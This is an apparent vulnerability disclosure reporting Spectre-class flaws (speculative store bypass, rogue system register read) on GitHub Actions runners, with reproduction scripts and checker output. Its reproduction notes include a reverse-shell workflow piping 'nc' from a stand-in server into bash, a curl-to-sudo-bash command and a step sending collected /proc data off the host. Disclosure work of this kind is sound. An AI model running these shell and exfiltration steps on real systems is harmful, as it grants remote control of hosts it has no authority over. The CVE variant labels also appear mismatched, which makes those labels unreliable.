## Overview

Github Actions "Virtual Machines" on Linux Kernel 5.8.0-1036-azure_x86_64 mount with parameters vulnerable to both a **Speculative Store Bypass, Variant 4 [CVE-2018-3640](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3640)** & **Rogue System Register Read, Variant 3a [CVE-2018-3639](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3640)**. Both SSB & RSRR are variants of the popular Meltdown & Spectre vulnerabilities.

I have confirmed these issues in three manner; first, while conducting exploratory vulnerability research into the Kernel & Virtual machine used by workflow steps in the Github Actions systems, second with a [purposed tool](https://github.com/speed47/spectre-meltdown-checker) for analyzing [transient execution vulnerabilities](https://en.wikipedia.org/wiki/Transient_execution_CPU_vulnerability) against a systems kernel, and finally with the [official repository for testing meltdown](https://github.com/IAIK/meltdown) released by the researchers whom published [Meltdown: Reading Kernel Memory from User Space](https://meltdownattack.com/meltdown.pdf).

## Background

The past two days I have spent time analyzing the Kernel and Virtual Machine used for "workflows" in the Github Actions systems. My method for testing can be summarized by "Iteratively creating patches of Kernel & VM stats by comparing "snapshots" of  consecutive workflow executions", each patch is ~60k lines & I've attached an example here to view.

Given the current results & the potential damage to Github's services, infrastructure, and/or users if deeper testing ensued I have chosen to conclude my vulnerability research on this specific topic & write this report. 

## Confirmation 1

While creating iterative patches from a myriad of information about the actions kernel I noticed that  `/proc/self/status` & `/proc/$$/status` both contain the vulnerable flag added in [torvalds/linux@d93e5e2](https://github.com/torvalds/linux/commit/d93e5e2d03d4f41dfedb92200a2c0413ab8ee4e7) with the specific purpose of alerting userspace to the active Kernel vulnerability.

```
Speculation_Store_Bypass:	vulnerable
```

Additionally, the extended feature flags on the cpu-set show that the SSB protections are not enabled & the CPU class is a vulnerable type.
```
   brand = "Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz"
   extended feature flags (7):
	SSBD: speculative store bypass disable   = false
```

## Reproduce
Execute & retrieve the output of the following from Github Actions workflow.
```bash
#!/bin/bash
sudo apt install cpuid
results_folder=${1:-"results"}
mkdir -p ${results_folder}
sudo cat /proc/self/maps -vv > ${results_folder}/memory_maps.proc.self
sudo cat /proc/1/maps > ${results_folder}/memory_maps.proc.1
sudo cat /proc/$$/maps > ${results_folder}/memory_maps.proc.u
sudo cat /proc/self/status > ${results_folder}/status.proc.self
sudo cat /proc/1/status > ${results_folder}/status.proc.1
sudo cat /proc/$$/status > ${results_folder}/status.proc.u
sudo cpuid > ${results_folder}/cpu.stats

tar cf  ${results_folder}.tar.xz ${results_folder}/

# Now extract the tarball to a host you can inspect it on, one-way is to use wormhole to create a tunnel between the Actions host & your development machine
# Example
sudo apt install wormhole
wormhole send ${results_folder}.tar.xz

```
Then inspect the output however most convenient, I've attached copies of these various outputs from a random actions execution.

If this was my machine I would call it here & mitigate the issue immediately, but I wanted to take extra steps to ensure that there is not a misunderstanding on my behalf. So I looked around for tools purposed to analyze this class of vulnerability.

### Confirmation 2

Using [spectre-meltdown-checker](https://github.com/speed47/spectre-meltdown-checker) we can see this script identifies the same two (out of fifteen) aforementioned vulnerabilities.

```bash
CVE-2018-3640 aka 'Variant 3a, rogue system register read'
	* CPU microcode mitigates the vulnerability:  NO 
> STATUS:  VULNERABLE
  
CVE-2018-3639 aka 'Variant 4, speculative store bypass'
		* Mitigated according to the /sys interface:  NO  (Vulnerable)
		* Kernel supports disabling speculative store bypass (SSB):  YES  (found in /proc/self/status)
		* SSB mitigation is enabled and active:  NO 
> STATUS:  VULNERABLE
...
> SUMMARY: 
	CVE-2017-5753   ->   OK 
	CVE-2017-5715   ->   OK 
	CVE-2017-5754   ->   OK 
**	CVE-2018-3640   ->   KO **
**	CVE-2018-3639   ->   KO **
	CVE-2018-3615   ->   OK 
	CVE-2018-3620   ->   OK 
	CVE-2018-3646   ->   OK 
	CVE-2018-12126  ->   OK 
	CVE-2018-12130  ->   OK 
	CVE-2018-12127  ->   OK 
	CVE-2019-11091  ->   OK 
	CVE-2019-11135  ->   OK 
	CVE-2018-12207  ->   OK 
	CVE-2020-0543   ->   OK
```

To reproduce run & store the output of the following from a Github Actions workflow:
```bash
curl -sS https://raw.githubusercontent.com/speed47/spectre-meltdown-checker/master/spectre-m
eltdown-checker.sh | sudo bash
```
Or following the instructions is the repository, as to quote them;

> You never blindly run scripts you downloaded from the Internet, do you?

### Confirmation 3

Now testing with the official repository cited in [Meltdown: Reading Kernel Memory from User Space](https://meltdownattack.com/meltdown.pdf).

```
git clone https://github.com/IAIK/meltdown.git
cd meltdown/libkdump
make
sudo make install
```
Running the first testset from `../meltdown`
```
make
taskset 0x1 ./test
```
We get the correct ouput
```
Expect: Welcome to the wonderful world of microarchitectural attacks
   Got: Welcome to the wonderful world of microarchitectural attacks
```
I thought of testing meltdown further, however, after viewing the code & the warnings provided on the repository I deemed it unsafe for both Github's Infrastructure & Users.

>  If you find that a computer is susceptible to the Meltdown bug, you may want to avoid using it as a **multi-user system**. Meltdown breaches the CPU's memory protection. On a machine that is susceptible to the Meltdown bug, one process can read all pages used by other processes or by the kernel. This code is only for testing purposes. Do not run it on any productive systems. Do not run it on any system that might be used by another person or entity.

- - -

## Reproduction notes

**
The attached video DEMO.mp4 demonstrates all three confirmation methods using a reverse shell
**

All the `bash` scripts I provide are intended to be executed in the context of a workflow step, I found that binding a reverse shell in the Actions workflow is the easiest way to test a variety of items. This requires you have access to a networked host for both the github actions workflow to bind too and to act as a shell for you to interact with the VM. 

Using `nc` we can easily set this up, assuming you have your sever host run the following:
```bash
$  sudo nc -lvkw 580 MY-SERVER.com 443
> Listening on MY-SERVER.com 443
```
Create a new repository & define the following workflow step.
```yml
name: reverse-shell
on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: reverse-shell
        run: |
          bash <(nc -v MY-SERVER.com 443)
```
With your server listening on port 443, execute the workflow & the VM will bind to your server, executing any input you provide it.

- - -

## Resources
- https://us-cert.cisa.gov/ncas/alerts/TA18-141A
- https://github.com/IAIK/meltdown
- https://github.com/speed47/spectre-meltdown-checker
- https://www.man7.org/linux/man-pages/man5/proc.5.html
- https://www.man7.org/linux/man-pages/man7/cpuset.7.html
- https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html
- https://www.man7.org/linux/man-pages/man7/capabilities.7.html
- https://www.kernel.org/doc/html/latest/staging/index.html#atomic-types
- https://www.kernel.org/doc/html/latest/filesystems/index.html
- https://www.computerhope.com/unix/lsof.htm
- https://meltdownattack.com
- https://blogs.msdn.microsoft.com/vcblog/2018/01/15/spectre-mitigations-in-msvc/
- http://lists.llvm.org/pipermail/llvm-commits/Week-of-Mon-20180101/513630.html
- https://github.com/ARM-software/speculation-barrier
- https://arxiv.org/abs/1801.01207
